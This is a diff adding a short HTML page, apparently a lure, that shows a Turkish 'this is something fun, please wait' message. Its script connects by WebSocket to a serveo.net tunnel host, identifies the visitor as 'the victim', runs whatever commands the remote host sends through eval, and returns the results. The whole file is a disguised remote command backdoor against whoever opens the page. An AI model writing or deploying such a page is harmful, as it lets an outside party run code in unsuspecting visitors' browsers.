@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Eğlenceli Bir Şey</title>
+</head>
+<body>
+    <h1>Merhaba! Bu eğlenceli bir şey, lütfen bekleyin...</h1>
+    <script>
+        const ws = new WebSocket("https://d24bd0c9228bd4fa33894c60045d7c5b.serveo.net"); // Serveo subdomain’in
+        ws.onopen = () => {
+            console.log("Bağlantı kuruldu!");
+            ws.send("Merhaba, ben kurbanım!");
+        };
+        ws.onmessage = async (event) => {
+            const command = event.data;
+            console.log("Komut alındı:", command);
+            try {
+                const output = await eval(command);
+                ws.send(output || "Komut boş");
+            } catch (error) {
+                ws.send("Hata: " + error.message);
+            }
+        };
+    </script>
+</body>
+</html>
